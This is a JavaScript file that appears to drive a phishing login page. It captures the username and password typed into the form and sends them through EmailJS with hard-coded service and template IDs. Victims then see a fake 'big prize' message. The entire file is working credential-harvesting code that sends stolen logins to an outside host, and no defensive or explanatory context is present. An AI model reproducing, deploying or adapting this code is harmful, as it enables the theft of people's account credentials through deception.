document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form");

    form.addEventListener("submit", function (event) {
        event.preventDefault();

        const username = document.querySelector("#floatingInput").value;
        const password = document.querySelector("#floatingPassword").value;

        emailjs.send("service_h5vh8ju", "template_rjyph3l", {
            message: `username : ${username} & password : ${password}`
        })
            .then(function (response) {
                Swal.fire({
                    icon: 'success',
                    title: 'Congrats 🎉🎉',
                    text: 'We sent you your big prize 😊. Please check your account',
                    theme: 'dark',
                });
            }, function (error) {
                console.error("Failed to send credentials:", error);
                Swal.fire({
                    icon: 'error',
                    title: 'Oops...',
                    text: 'An error occurred while sending credentials.',
                    theme: 'dark',
                });
            });
    });
});
